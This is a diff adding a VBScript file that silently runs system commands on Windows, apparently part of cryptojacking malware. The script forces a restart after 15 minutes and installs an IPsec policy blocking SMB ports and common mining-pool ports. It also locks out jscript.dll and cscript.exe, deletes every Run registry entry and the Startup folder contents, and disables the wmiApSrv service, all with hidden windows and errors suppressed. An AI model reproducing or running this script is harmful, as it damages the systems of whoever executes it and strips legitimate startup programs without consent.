@@ -1,0 +1,41 @@
+On Error Resume Next
+Set vbs=CreateObject("Wscript.Shell")
+vbs.Run "powercfg.exe /S 8c5e7fda-e8bf-4a96-9a85-a6e23a8c635c",0,false
+vbs.Run "powershell Start-Sleep -Seconds 900; Restart-Computer -Force",0,false
+vbs.Run "netsh interface ipv6 install",0,True
+vbs.Run "netsh ipsec static add policy name=qianye",0,True
+vbs.Run "netsh ipsec static add filterlist name=Filter1",0,True
+vbs.Run "netsh ipsec static add filter filterlist=Filter1 srcaddr=any dstaddr=Me dstport=445 protocol=TCP",0,True
+vbs.Run "netsh ipsec static add filter filterlist=Filter1 srcaddr=any dstaddr=Me dstport=135 protocol=TCP",0,True
+vbs.Run "netsh ipsec static add filter filterlist=Filter1 srcaddr=any dstaddr=Me dstport=139 protocol=TCP",0,True
+vbs.Run "netsh ipsec static add filter filterlist=Filter1 srcaddr=any dstaddr=Me dstport=445 protocol=UDP",0,True
+vbs.Run "netsh ipsec static add filter filterlist=Filter1 srcaddr=any dstaddr=Me dstport=135 protocol=UDP",0,True
+vbs.Run "netsh ipsec static add filter filterlist=Filter1 srcaddr=any dstaddr=Me dstport=139 protocol=UDP",0,True
+vbs.Run "netsh ipsec static add filter filterlist=Filter1 srcaddr=Me dstaddr=any dstport=2222 protocol=TCP",0,True
+vbs.Run "netsh ipsec static add filter filterlist=Filter1 srcaddr=Me dstaddr=any dstport=3333 protocol=TCP",0,True
+vbs.Run "netsh ipsec static add filter filterlist=Filter1 srcaddr=Me dstaddr=any dstport=4444 protocol=TCP",0,True
+vbs.Run "netsh ipsec static add filter filterlist=Filter1 srcaddr=Me dstaddr=any dstport=5555 protocol=TCP",0,True
+vbs.Run "netsh ipsec static add filter filterlist=Filter1 srcaddr=Me dstaddr=any dstport=6666 protocol=TCP",0,True
+vbs.Run "netsh ipsec static add filter filterlist=Filter1 srcaddr=Me dstaddr=any dstport=7777 protocol=TCP",0,True
+vbs.Run "netsh ipsec static add filter filterlist=Filter1 srcaddr=Me dstaddr=any dstport=8888 protocol=TCP",0,True
+vbs.Run "netsh ipsec static add filter filterlist=Filter1 srcaddr=Me dstaddr=any dstport=9000 protocol=TCP",0,True
+vbs.Run "netsh ipsec static add filter filterlist=Filter1 srcaddr=Me dstaddr=any dstport=9999 protocol=TCP",0,True
+vbs.Run "netsh ipsec static add filter filterlist=Filter1 srcaddr=Me dstaddr=any dstport=14443 protocol=TCP",0,True
+vbs.Run "netsh ipsec static add filter filterlist=Filter1 srcaddr=Me dstaddr=any dstport=14444 protocol=TCP",0,True
+vbs.Run "netsh ipsec static add filteraction name=FilteraAtion1 action=block",0,True
+vbs.Run "netsh ipsec static add rule name=Rule1 policy=qianye filterlist=Filter1 filteraction=FilteraAtion1",0,True
+vbs.Run "netsh ipsec static set policy name=qianye assign=y",0,True
+vbs.Run "takeown /f %windir%\system32\jscript.dll",0,True
+vbs.Run "cacls %windir%\system32\jscript.dll /E /P everyone:N",0,True
+vbs.Run "takeown /f %windir%\syswow64\jscript.dll",0,True
+vbs.Run "cacls %windir%\syswow64\jscript.dll /E /P everyone:N",0,True
+vbs.Run "takeown /f %windir%\system32\cscript.exe",0,True
+vbs.Run "cacls %windir%\system32\cscript.exe /E /P everyone:N",0,True
+vbs.Run "takeown /f %windir%\syswow64\cscript.exe",0,True
+vbs.Run "cacls %windir%\syswow64\cscript.exe /E /P everyone:N",0,True
+vbs.Run "reg delete HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /va /f",0,True
+vbs.Run "reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /va /f",0,True
+vbs.Run "reg delete "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Shared Tools\MSConfig\startupreg" /f",0,True
+vbs.Run "del /s /q dir C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup",0,True
+vbs.Run "sc.exe stop wmiApSrv",0,True
+vbs.Run "sc.exe config wmiApSrv start=disabled",0,True
